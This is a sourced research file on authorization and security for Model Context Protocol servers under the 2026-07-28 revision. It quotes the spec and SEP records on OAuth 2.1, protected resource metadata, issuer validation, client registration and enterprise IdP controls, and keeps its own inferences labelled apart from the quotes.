# MCP Authorization and Security — Primary-Source Research

**Topic:** Authorization and security for MCP servers.
**Protocol revision under study:** `2026-07-28`.
**Research date:** 2026-10-02.
**Method:** Direct `webfetch` of official Model Context Protocol specifications, tutorials, SEP records, and changelog on `modelcontextprotocol.io`. Every externally sourced statement below carries a short exact quotation and an inline descriptive link in the same sentence.

## Notation Used in This File

- **SOURCE FACT** — a normative or factual statement quoted verbatim from a retrieved primary source.
- **SOURCE CLAIM (rank)** — an assertion made by a source, with a descriptive rank: `(normative spec)`, `(SEP design record)`, `(tutorial/derived)`, `(index/metadata)`.
- **AI INFERENCE** — a conclusion drawn by this researcher, explicitly naming the quoted facts it depends on.
- **PLAUSIBLE NOT VERIFIED** — plausible but not confirmed by any retrieved source.
- **UNKNOWN** — not established by any retrieved source.

## Source Inventory and Retrieval Status

All ten requested URLs were retrieved successfully. One extra SEP (SEP-2468) referenced by the brief but given without a URL was located via the SEP index and retrieved.

| # | Source | URL | Status |
| - | - | - | - |
| 1 | Authorization (core spec) | [specification/2026-07-28/basic/authorization/index.md](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md) | Retrieved |
| 2 | Authorization Server Discovery | [specification/2026-07-28/basic/authorization/authorization-server-discovery.md](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/authorization-server-discovery.md) | Retrieved |
| 3 | Client Registration | [specification/2026-07-28/basic/authorization/client-registration.md](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration.md) | Retrieved |
| 4 | Authorization Security Considerations | [specification/2026-07-28/basic/authorization/security-considerations.md](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md) | Retrieved |
| 5 | Understanding Authorization in MCP (tutorial) | [docs/2026-07-28/tutorials/security/authorization.md](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md) | Retrieved |
| 6 | Security Best Practices (tutorial) | [docs/2026-07-28/tutorials/security/security_best_practices.md](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md) | Retrieved |
| 7 | SEP-985 | [seps/985-align-oauth-20-protected-resource-metadata-with-rf.md](https://modelcontextprotocol.io/seps/985-align-oauth-20-protected-resource-metadata-with-rf.md) | Retrieved |
| 8 | SEP-991 | [seps/991-enable-url-based-client-registration-using-oauth-c.md](https://modelcontextprotocol.io/seps/991-enable-url-based-client-registration-using-oauth-c.md) | Retrieved |
| 9 | SEP-1046 | [seps/1046-support-oauth-client-credentials-flow-in-authoriza.md](https://modelcontextprotocol.io/seps/1046-support-oauth-client-credentials-flow-in-authoriza.md) | Retrieved |
| 10 | SEP-990 | [seps/990-enable-enterprise-idp-policy-controls-during-mcp-o.md](https://modelcontextprotocol.io/seps/990-enable-enterprise-idp-policy-controls-during-mcp-o.md) | Retrieved |
| — | SEP-2468 (not in brief's URL list) | [seps/2468-recommend-issuer-claim-for-auth.md](https://modelcontextprotocol.io/seps/2468-recommend-issuer-claim-for-auth.md) | Retrieved after locating via index |
| — | SEP index | [seps/index.md](https://modelcontextprotocol.io/seps/index.md) | Retrieved |
| — | Specification changelog | [specification/2026-07-28/changelog.md](https://modelcontextprotocol.io/specification/2026-07-28/changelog.md) | Retrieved |
| — | SEP-1024 (extra, local server install) | [seps/1024-mcp-client-security-requirements-for-local-server-.md](https://modelcontextprotocol.io/seps/1024-mcp-client-security-requirements-for-local-server-.md) | Retrieved |

**Failed retrieval:** `https://modelcontextprotocol.io/seps/2468-authorization-server-issuer-validation.md` returned HTTP 404; the correct path is [`/seps/2468-recommend-issuer-claim-for-auth`](https://modelcontextprotocol.io/seps/2468-recommend-issuer-claim-for-auth). This is recorded and the correct document was retrieved instead.

---

## 1. The OAuth 2.1-Based Framework

### 1.1 Authorization is optional and transport-dependent

**SOURCE FACT:** The specification states "Authorization is **OPTIONAL** for MCP implementations" ([Authorization, Introduction](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** For HTTP, "Implementations using an HTTP-based transport **SHOULD** conform to this specification" ([Authorization, Protocol Requirements](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** For local process transports, "Implementations using an STDIO transport **SHOULD NOT** follow this specification, and instead retrieve credentials from the environment" ([Authorization, Protocol Requirements](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** The tutorial reinforces this: "Authorization in the Model Context Protocol (MCP) secures access to sensitive resources and operations exposed by MCP servers" and "While authorization for MCP servers is **optional**, it is strongly recommended when" the server handles user-specific data, audit requirements, user-consented APIs, enterprise controls, or per-user rate limits ([Understanding Authorization in MCP](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/authorization.md)).

**AI INFERENCE:** Because STDIO is explicitly steered away from this specification (quoted above), the OAuth 2.1 framework of this file is effectively an HTTP-transport concern; local STDIO servers are expected to use environment-provided credentials instead. An implementation that applies OAuth browser flows to STDIO would run against the specification's guidance.

### 1.2 Exact standards stack and version labels

**SOURCE FACT:** The authorization mechanism is "based on established specifications listed below" including "OAuth 2.1 IETF DRAFT ([draft-ietf-oauth-v2-1-13](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13))", "OAuth 2.0 Bearer Token Usage ([RFC6750](https://datatracker.ietf.org/doc/html/rfc6750))", "OAuth 2.0 Authorization Server Metadata ([RFC8414](https://datatracker.ietf.org/doc/html/rfc8414))", "OAuth 2.0 Dynamic Client Registration Protocol ([RFC7591](https://datatracker.ietf.org/doc/html/rfc7591))", "Resource Indicators for OAuth 2.0 ([RFC8707](https://www.rfc-editor.org/rfc/rfc8707.html))", "OAuth 2.0 Protected Resource Metadata ([RFC9728](https://datatracker.ietf.org/doc/html/rfc9728))", "OAuth 2.0 Authorization Server Issuer Identification ([RFC9207](https://datatracker.ietf.org/doc/html/rfc9207))", "OAuth Client ID Metadata Documents ([draft-ietf-oauth-client-id-metadata-document-00](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-client-id-metadata-document-00))", "OpenID Connect Discovery 1.0", and "OpenID Connect Dynamic Client Registration 1.0" ([Authorization, Standards Compliance](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** The framework "implements a selected subset of their features to ensure security and interoperability while maintaining simplicity" ([Authorization, Standards Compliance](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**AI INFERENCE:** The stack is deliberately a *profile*, not a full implementation of each standard; the quoted phrase "selected subset" means an MCP server implementer cannot assume every optional feature of OAuth 2.1, RFC 9728, or the CIMD draft is in scope.

### 1.3 Roles

**SOURCE FACT:** "A protected *MCP server* acts as an [OAuth 2.1 resource server](https://www.ietf.org/archive/id/draft-ietf-oauth-v2-1-13.html#name-roles), capable of accepting and responding to protected resource requests using access tokens" ([Authorization, Roles](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** "An *MCP client* acts as an [OAuth 2.1 client](https://www.ietf.org/archive/id/draft-ietf-oauth-v2-1-13.html#name-roles), making protected resource requests on behalf of a resource owner" ([Authorization, Roles](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** "The *authorization server* is responsible for interacting with the user (if necessary) and issuing access tokens for use at the MCP server. The implementation details of the authorization server are beyond the scope of this specification. It may be hosted with the resource server or a separate entity" ([Authorization, Roles](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

### 1.4 The five normative overview requirements

**SOURCE FACT:** "Authorization servers **MUST** implement OAuth 2.1 with appropriate security measures for both confidential and public clients" ([Authorization, Overview](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** "Authorization servers and MCP clients **SHOULD** support [OAuth Client ID Metadata Documents]" (point 2), and "Authorization servers and MCP clients **MAY** support the OAuth 2.0 Dynamic Client Registration Protocol ([RFC7591])" where "Dynamic Client Registration is deprecated and retained for backwards compatibility" (point 3) ([Authorization, Overview](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** "MCP servers **MUST** implement OAuth 2.0 Protected Resource Metadata ([RFC9728]). MCP clients **MUST** use OAuth 2.0 Protected Resource Metadata for authorization server discovery" (point 4) ([Authorization, Overview](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** "MCP authorization servers **MUST** provide at least one of the following discovery mechanisms: OAuth 2.0 Authorization Server Metadata ([RFC8414]); [OpenID Connect Discovery 1.0]", and "MCP clients **MUST** support both [discovery mechanisms]" (point 5) ([Authorization, Overview](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

---

## 2. MCP Servers as OAuth Resource Servers and RFC 9728 Protected Resource Metadata

### 2.1 Why the server publishes metadata

**SOURCE FACT:** "MCP servers advertise their associated authorization servers through OAuth 2.0 Protected Resource Metadata, and MCP clients determine authorization server endpoints and supported capabilities through authorization server metadata discovery" ([Authorization, Authorization Server Discovery](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** "MCP servers **MUST** implement the OAuth 2.0 Protected Resource Metadata ([RFC9728]) specification to indicate the locations of authorization servers. The Protected Resource Metadata document returned by the MCP server **MUST** include the `authorization_servers` field containing at least one authorization server" ([Authorization Server Discovery, Authorization Server Location](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/authorization-server-discovery.md)).

**SOURCE FACT:** Multiple authorization servers are allowed: "Implementors should note that Protected Resource Metadata documents can define multiple authorization servers. The responsibility for selecting which authorization server to use lies with the MCP client" ([Authorization Server Discovery](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/authorization-server-discovery.md)).

**SOURCE FACT:** Because client identifiers are issuer-specific, "Clients **MUST** maintain separate registration state (client credentials, tokens) per authorization server and **MUST NOT** assume that credentials valid for one authorization server will be accepted by another" ([Authorization Server Discovery](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/authorization-server-discovery.md)).

**AI INFERENCE:** The server's PRM document is the trust pivot that lets a client that has never seen the server find the right authorization server (quoted `authorization_servers` requirement); therefore the RFC 9728 document is not optional metadata but the entry point of the whole flow.

### 2.2 The two discovery mechanisms (SEP-985 background)

**SOURCE FACT:** "MCP servers **MUST** implement one of the following discovery mechanisms" — "WWW-Authenticate Header: Include the resource metadata URL in the `WWW-Authenticate` HTTP header under `resource_metadata` when returning `401 Unauthorized` responses" or "Well-Known URI: Serve metadata at a well-known URI" at either the MCP endpoint path (`https://example.com/.well-known/oauth-protected-resource/public/mcp`) or the root ([Authorization Server Discovery, Protected Resource Metadata Discovery Requirements](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/authorization-server-discovery.md)).

**SOURCE FACT:** "MCP clients **MUST** support both discovery mechanisms and use the resource metadata URL from the parsed `WWW-Authenticate` headers when present; otherwise, they **MUST** fall back to constructing and requesting the well-known URIs in the order listed above" ([Authorization Server Discovery](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/authorization-server-discovery.md)).

**SOURCE CLAIM (SEP design record):** SEP-985 records the historical motivation: "Currently, the MCP spec requires the use of the HTTP WWW-Authenticate header when returning a 401 Unauthorized to indicate the location of the protected resource metadata," while "RFC 9728, Section 5 states: "A protected resource MAY use the WWW-Authenticate HTTP response header field, as discussed in RFC 9110, to return a URL to its protected resource metadata to the client."" ([SEP-985: Align OAuth 2.0 Protected Resource Metadata with RFC 9728](https://modelcontextprotocol.io/seps/985-align-oauth-20-protected-resource-metadata-with-rf.md)).

**SOURCE FACT:** SEP-985's proposed state was "Clients MUST interpret the WWW-Authenticate header, and fallback to probing for metadata if not present. Servers SHOULD return the WWW-Authenticate header" ([SEP-985](https://modelcontextprotocol.io/seps/985-align-oauth-20-protected-resource-metadata-with-rf.md)).

**SOURCE FACT:** SEP-985 has status "Final" and type "Standards Track", created "2025-07-16", author "sunishsheth2009" ([SEP-985](https://modelcontextprotocol.io/seps/985-align-oauth-20-protected-resource-metadata-with-rf.md)).

**SOURCE FACT (metadata):** SEP-985 carries the standing notice that "This SEP has reached Final status and is preserved as a historical record of the design as accepted. Changes made to the protocol after finalization are not reflected here" ([SEP-985](https://modelcontextprotocol.io/seps/985-align-oauth-20-protected-resource-metadata-with-rf.md)).

**AI INFERENCE:** The current spec's "MUST implement one of the following discovery mechanisms" (both WWW-Authenticate and well-known) is a stricter realization of SEP-985's "Servers SHOULD return the WWW-Authenticate header" plus probe fallback, and the SEP's own notice explicitly directs implementers to the current spec rather than the SEP. Do not cite SEP-985 for current requirements.

---

## 3. Resource Indicators (RFC 8707) as a Client Requirement

**SOURCE FACT:** "MCP clients **MUST** implement Resource Indicators for OAuth 2.0 as defined in [RFC 8707](https://www.rfc-editor.org/rfc/rfc8707.html) to explicitly specify the target resource for which the token is being requested" ([Authorization, Resource Parameter Implementation](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** The `resource` parameter "1. **MUST** be included in both authorization requests and token requests. 2. **MUST** identify the MCP server that the client intends to use the token with. 3. **MUST** use the canonical URI of the MCP server as defined in RFC 8707 Section 2" ([Authorization, Resource Parameter Implementation](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** "MCP clients **MUST** send this parameter regardless of whether authorization servers support it" ([Authorization, Resource Parameter Implementation](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** Valid canonical URIs include `https://mcp.example.com/mcp`, `https://mcp.example.com`, `https://mcp.example.com:8443`, and `https://mcp.example.com/server/mcp`; invalid examples include `mcp.example.com` (missing scheme) and `https://mcp.example.com#fragment` (contains fragment) ([Authorization, Canonical Server URI](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** The security considerations page frames the security payoff: "RFC 8707 Resource Indicators provide critical security benefits by binding tokens to their intended audiences **when the Authorization Server supports the capability**" ([Authorization Security Considerations, Token Audience Binding and Validation](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md)).

**AI INFERENCE:** The specification makes the client send `resource` unconditionally ("MUST send this parameter regardless of whether authorization servers support it") while conceding benefit depends on AS support ("when the Authorization Server supports the capability"), so a client cannot treat resource binding as guaranteed enforcement — it must also work with servers that ignore the parameter.

---

## 4. Authorization-Server Discovery

### 4.1 Endpoint probe order and issuer check

**SOURCE FACT:** "MCP uses the default `oauth-authorization-server` well-known URI suffix defined in [RFC 8414 Section 3.1] for authorization server metadata discovery. MCP does not define an application-specific well-known URI suffix" ([Authorization Server Discovery, Authorization Server Metadata Discovery](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/authorization-server-discovery.md)).

**SOURCE FACT:** For issuer URLs **with** path components (e.g. `https://auth.example.com/tenant1`), clients "MUST" try, in order: `/.well-known/oauth-authorization-server/tenant1`, `/.well-known/openid-configuration/tenant1`, then `https://auth.example.com/tenant1/.well-known/openid-configuration` ([Authorization Server Discovery](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/authorization-server-discovery.md)).

**SOURCE FACT:** For issuer URLs **without** path components, clients "MUST" try: `/.well-known/oauth-authorization-server` then `/.well-known/openid-configuration` ([Authorization Server Discovery](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/authorization-server-discovery.md)).

**SOURCE FACT:** "the `issuer` value in the document **MUST** be identical to the issuer identifier used to construct the well-known URL. If they differ, the client **MUST NOT** use the metadata. For example, a document fetched from `https://attacker.example/.well-known/oauth-authorization-server` that contains `"issuer": "https://honest.example"` **MUST** be rejected" ([Authorization Server Discovery](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/authorization-server-discovery.md)).

### 4.2 Pre-redirect issuer recording and RFC 9207 `iss` validation

**SOURCE FACT:** "Before redirecting the user-agent, the client **MUST** record the `issuer` value from the selected authorization server's validated metadata document ... and associate it with the same per-request record used to store the PKCE code verifier (and the `state` value, if used). The validation in this section depends on that recorded value being authentic; it provides no protection if the expected issuer was obtained from an unvalidated source" ([Authorization, Authorization Response Validation](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** "MCP authorization servers **SHOULD** include the `iss` parameter in authorization responses, including error responses, as defined in [RFC9207 Section 2]" and "Authorization servers that include the `iss` parameter **MUST** advertise this by setting `authorization_response_iss_parameter_supported` to `true` in their metadata" ([Authorization, Authorization Response Validation](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** The client action table is: when `authorization_response_iss_parameter_supported` is `true` and `iss` is present, "Compare to the recorded issuer using simple string comparison"; when `true` and absent, "Reject the response"; when `false` or absent and `iss` present, "Compare to the recorded issuer using simple string comparison"; when `false` or absent and `iss` absent, "Proceed" ([Authorization, Authorization Response Validation](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** "A future revision of this specification is expected to upgrade authorization server inclusion of `iss` from **SHOULD** to **MUST**" ([Authorization, Authorization Response Validation](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT:** "clients **MUST NOT** apply scheme or host case folding, default-port elision, trailing-slash, or percent-encoding normalization ... before comparison", and "This validation applies equally to error responses - on mismatch the client **MUST NOT** act on or display `error`, `error_description`, or `error_uri`" ([Authorization, Authorization Response Validation](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**SOURCE FACT (changelog):** The `2026-07-28` revision records: "Authorization servers **SHOULD** include the `iss` parameter in authorization responses per RFC 9207, and MCP clients **MUST** validate a present `iss` against the recorded issuer before redeeming the authorization code ([SEP-2468])" ([Key Changes, Minor changes item 7](https://modelcontextprotocol.io/specification/2026-07-28/changelog.md)).

### 4.3 SEP-2468 — the design record for `iss`

**SOURCE FACT:** SEP-2468 "proposes recommending the inclusion and requiring the validation of an explicit issuer (iss) parameter in Model Context Protocol (MCP) authorization responses to mitigate authorization mix‑up attacks" and "follows the specifications defined in [RFC9207]" ([SEP-2468](https://modelcontextprotocol.io/seps/2468-recommend-issuer-claim-for-auth.md)).

**SOURCE FACT:** SEP-2468's specification: "MCP authorization servers SHOULD include an issuer (*iss*) parameter in authorization responses, including error responses, as defined in [RFC9207]" and "Authorization servers that do so MUST advertise it by setting `authorization_response_iss_parameter_supported: true`" ([SEP-2468](https://modelcontextprotocol.io/seps/2468-recommend-issuer-claim-for-auth.md)).

**SOURCE FACT:** "If issuer validation fails, the client **MUST** treat the response as invalid and abort the authorization flow" ([SEP-2468](https://modelcontextprotocol.io/seps/2468-recommend-issuer-claim-for-auth.md)).

**SOURCE FACT:** SEP-2468 gives the reason `iss` was chosen over unique redirect URIs: "A unique redirect\_uri per issuer is not possible with Client ID Metadata Documents (the recommended registration approach) and is operationally expensive with Dynamic Client Registration" ([SEP-2468](https://modelcontextprotocol.io/seps/2468-recommend-issuer-claim-for-auth.md)).

**SOURCE CLAIM (SEP design record):** SEP-2468's author is "Emily Lauber ([@EmLauber](https://github.com/EmLauber))", sponsor "[@pcarleton](https://github.com/pcarleton)", status "Final", type "Standards Track", created "2026-03-25" ([SEP-2468](https://modelcontextprotocol.io/seps/2468-recommend-issuer-claim-for-auth.md)).

**AI INFERENCE:** The current spec's "SHOULD include `iss`" plus mandatory *validation when present* (quoted above), combined with the SEP's "MUST ... abort" on failure, means the client-side obligation is stronger than the server-side one: clients must enforce on any `iss` they receive even though honest servers are only urged to emit it. The spec itself flags the future move to a server MUST.

---

## 5. Client Registration: DCR Deprecation and Client ID Metadata Documents (SEP-991)

### 5.1 Three mechanisms and selection priority

**SOURCE FACT:** "MCP supports three client registration mechanisms": "Client ID Metadata Documents: When client and server have no prior relationship (most common)", "Pre-registration: When client and server have an existing relationship", and "Dynamic Client Registration: For backwards compatibility or specific requirements" ([Client Registration](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration.md)).

**SOURCE FACT:** The selection priority is: "1. Use pre-registered client information ... 2. Use Client ID Metadata Documents if the Authorization Server indicates that it supports them ... 3. Use Dynamic Client Registration as a fallback ... 4. Prompt the user to enter the client information" ([Client Registration](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration.md)).

**SOURCE FACT:** "MCP clients **MUST** obtain a client ID through one of three registration mechanisms: Client ID Metadata Documents, pre-registration, or Dynamic Client Registration" ([Authorization, Client Registration](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

### 5.2 Client ID Metadata Documents (CIMD)

**SOURCE FACT:** "MCP clients and authorization servers **SHOULD** support OAuth Client ID Metadata Documents" and "This approach enables clients to use HTTPS URLs as client identifiers, where the URL points to a JSON document containing client metadata" ([Client Registration, Client ID Metadata Documents](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration.md)).

**SOURCE FACT — client duties:** "Clients **MUST** host their metadata document at an HTTPS URL following RFC requirements"; "The `client_id` URL **MUST** use the "https" scheme and contain a path component, e.g. `https://example.com/client.json`"; "The metadata document **MUST** include at least the following properties: `client_id`, `client_name`, `redirect_uris`"; "Clients **MUST** ensure the `client_id` value in the metadata matches the document URL exactly"; "Clients **MAY** use `private_key_jwt` for client authentication" ([Client Registration](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration.md)).

**SOURCE FACT — authorization-server duties:** "**SHOULD** fetch metadata documents when encountering URL-formatted client\_ids"; "**MUST** validate that the fetched document's `client_id` matches the URL exactly"; "**SHOULD** cache metadata respecting HTTP cache headers"; "**MUST** validate redirect URIs presented in an authorization request against those in the metadata document"; "**MUST** validate the document structure is valid JSON and contains required fields" ([Client Registration](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration.md)).

**SOURCE FACT — advertising support:** "Authorization servers advertise that they support clients using Client ID Metadata Documents by including the following property in their OAuth Authorization Server metadata" — `{"client_id_metadata_document_supported": true}` ([Client Registration, Advertising CIMD Support](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration.md)).

### 5.3 Dynamic Client Registration deprecation

**SOURCE FACT:** The warning box reads: "Dynamic Client Registration is deprecated. New implementations should use Client ID Metadata Documents instead. This option remains available for backwards compatibility with authorization servers that do not support Client ID Metadata Documents" ([Client Registration, Dynamic Client Registration](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration.md)).

**SOURCE FACT (changelog):** "Deprecate the OAuth 2.0 Dynamic Client Registration Protocol ([RFC7591]) as a client registration mechanism in favor of [Client ID Metadata Documents] ([PR #2858])" — listed under "Deprecated" ([Key Changes, Deprecated item 4](https://modelcontextprotocol.io/specification/2026-07-28/changelog.md)).

**SOURCE FACT — OIDC application_type:** "MCP clients **MUST** specify an appropriate `application_type` during Dynamic Client Registration", with native apps advised `application_type: "native"` and remote web apps `application_type: "web"`; "Omitting it defaults to `"web"` under OIDC, which can conflict with native-style redirect URIs" ([Client Registration, Application Type and Redirect URI Constraints](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration.md)).

**SOURCE FACT (changelog):** "Require MCP clients to specify an appropriate `application_type` during Dynamic Client Registration to avoid OpenID Connect redirect URI conflicts ([SEP-837])" ([Key Changes, Minor changes item 8](https://modelcontextprotocol.io/specification/2026-07-28/changelog.md)).

### 5.4 SEP-991 — the design record for URL-based client IDs

**SOURCE FACT:** SEP-991 "proposes adopting OAuth Client ID Metadata Documents as specified in [draft-parecki-oauth-client-id-metadata-document-03] ... as an additional client registration mechanism for the Model Context Protocol (MCP)" ([SEP-991](https://modelcontextprotocol.io/seps/991-enable-url-based-client-registration-using-oauth-c.md)).

**SOURCE FACT:** "The change to the specification will be adding Client ID Metadata documents as a SHOULD, and changing DCR to a MAY, as we think that Client ID Metadata documents are a better default option for this scenario" ([SEP-991](https://modelcontextprotocol.io/seps/991-enable-url-based-client-registration-using-oauth-c.md)).

**SOURCE FACT:** SEP-991 lists its status as "Final", type "Standards Track", created "2025-07-07", authors "Paul Carleton (@pcarleton) Aaron Parecki (@aaronpk)" ([SEP-991](https://modelcontextprotocol.io/seps/991-enable-url-based-client-registration-using-oauth-c.md)).

**SOURCE FACT:** SEP-991 names four concrete risks of the approach: "Localhost URL Impersonation", "Server Side Request Forgery (SSRF)", "Distributed Denial of Service (DDoS)", and "Maturity of referenced specification" ([SEP-991](https://modelcontextprotocol.io/seps/991-enable-url-based-client-registration-using-oauth-c.md)).

**SOURCE CLAIM (version drift):** SEP-991 references `draft-parecki-oauth-client-id-metadata-document-03`, whereas the current `2026-07-28` spec's standards list cites `draft-ietf-oauth-client-id-metadata-document-00` ([SEP-991](https://modelcontextprotocol.io/seps/991-enable-url-based-client-registration-using-oauth-c.md) and [Authorization, Standards Compliance](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**AI INFERENCE:** The draft identifier changed from the personal `draft-parecki-...-03` to the IETF `draft-ietf-...-00` between the SEP and the current revision (both quoted above), indicating the CIMD draft was adopted into an IETF working group. Implementers should follow the current spec's `draft-ietf-oauth-client-id-metadata-document-00` reference, not SEP-991's older identifier.

### 5.5 Authorization Server Binding of credentials

**SOURCE FACT:** "Clients that use pre-registered credentials, or persist client credentials obtained via Dynamic Client Registration, **MUST** associate those credentials with the specific authorization server that issued them, keyed by the authorization server's `issuer` identifier" and "**MUST NOT** reuse client credentials from a different authorization server and **MUST** re-register with the new authorization server" ([Client Registration, Authorization Server Binding](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration.md)).

**SOURCE FACT (changelog):** "Clarify that client credentials are bound to the authorization server that issued them: clients **MUST** key persisted credentials by the issuer identifier, **MUST NOT** reuse them with a different authorization server, and **MUST** re-register when the authorization server changes ([SEP-2352])" ([Key Changes, Minor changes item 9](https://modelcontextprotocol.io/specification/2026-07-28/changelog.md)).

**SOURCE FACT:** CIMD-based client IDs, by contrast, "are portable across authorization servers, since they are self-hosted HTTPS URLs resolved by the authorization server on demand. No re-registration is needed when the authorization server changes" ([Client Registration, Authorization Server Binding](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration.md)).

**AI INFERENCE:** The binding rule (quoted) plus CIMD portability (quoted) means the *issuer-keyed credential store* is required precisely for the two registration modes whose identifiers are local to an AS (pre-registration and DCR); CIMD is exempt because its identifier is a globally resolvable URL.

---

## 6. Client Credentials Flow (SEP-1046) and Enterprise IdP Controls (SEP-990)

### 6.1 Client credentials (machine-to-machine)

**SOURCE FACT:** SEP-1046's abstract states it "Recommends adding the OAuth client credentials flow to the authorization spec to enable machine-to-machine scenarios" ([SEP-1046](https://modelcontextprotocol.io/seps/1046-support-oauth-client-credentials-flow-in-authoriza.md)).

**SOURCE FACT:** The motivation is a gap: "The original authorization spec mentioned the client credentials flow, but it was dropped in subsequent revisions. Therefore, the spec is currently silent on how to solve machine-to-machine scenarios where an end-user is unavailable for interactive authorization" ([SEP-1046](https://modelcontextprotocol.io/seps/1046-support-oauth-client-credentials-flow-in-authoriza.md)).

**SOURCE FACT:** "To maximize interoperability (and minimize SDK complexity), this change would intentionally constrain the client credentials flow to two options: 1. JWT Assertions as per RFC 7523 (RECOMMENDED) 2. Client Secrets via HTTP Basic authentication (Allowed for maximum compatibility with existing systems)"; "Other options, such as mTLS, are not included" ([SEP-1046, Rationale](https://modelcontextprotocol.io/seps/1046-support-oauth-client-credentials-flow-in-authoriza.md)).

**SOURCE FACT:** SEP-1046 is "Final", "Standards Track", created "2025-07-23", author "Darin McAdams (@D-McAdams)" ([SEP-1046](https://modelcontextprotocol.io/seps/1046-support-oauth-client-credentials-flow-in-authoriza.md)).

**SOURCE FACT:** The core spec's step-up section acknowledges self-acting clients: "Clients acting on their own behalf (`client_credentials` clients) **MAY** attempt the step-up authorization flow or abort the request immediately" ([Authorization, Step-Up Authorization Flow](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/index.md)).

**AI INFERENCE:** Because SEP-1046 constrains the flow to JWT assertions (recommended) and client-secret HTTP Basic (allowed) (quoted), and the current spec still discusses `client_credentials` clients (quoted), machine-to-machine MCP authorization is a recognized but implementation-constrained case; mTLS is explicitly out of scope per SEP-1046.

### 6.2 Enterprise IdP policy controls

**SOURCE FACT:** SEP-990 describes an extension that "is designed to facilitate secure and interoperable authorization of MCP clients within corporate environments, leveraging existing enterprise identity infrastructure" ([SEP-990](https://modelcontextprotocol.io/seps/990-enable-enterprise-idp-policy-controls-during-mcp-o.md)).

**SOURCE FACT:** The benefit framing: "For end users, this removes the need to manually connect and authorize the MCP Client to individual services within the organization. For enterprise admins, this enables visibility and control over which MCP Servers are able to be used within the organization" ([SEP-990](https://modelcontextprotocol.io/seps/990-enable-enterprise-idp-policy-controls-during-mcp-o.md)).

**SOURCE FACT:** The flow exchanges an IdP ID token for an "ID-JAG" and then uses it at the MCP authorization server: the client does "Exchange ID Token for ID-JAG", the IdP "Evaluate[s] Policy" and "Responds with ID-JAG", then "Token Request with ID-JAG" and "Validate ID-JAG" yields an "MCP Access Token" ([SEP-990](https://modelcontextprotocol.io/seps/990-enable-enterprise-idp-policy-controls-during-mcp-o.md)).

**SOURCE FACT:** It is opt-in and additive: "This is designed to augment the existing OAuth profile by providing an alternative when used under an enterprise IdP. MCP clients can opt in to this profile when necessary" ([SEP-990, Breaking Changes](https://modelcontextprotocol.io/seps/990-enable-enterprise-idp-policy-controls-during-mcp-o.md)).

**SOURCE CLAIM (status inconsistency):** SEP-990 displays a green "Final" badge and is indexed as Final, yet its body ends with "**State:** Ready to Review" ([SEP-990](https://modelcontextprotocol.io/seps/990-enable-enterprise-idp-policy-controls-during-mcp-o.md) and [SEP index](https://modelcontextprotocol.io/seps/index.md)).

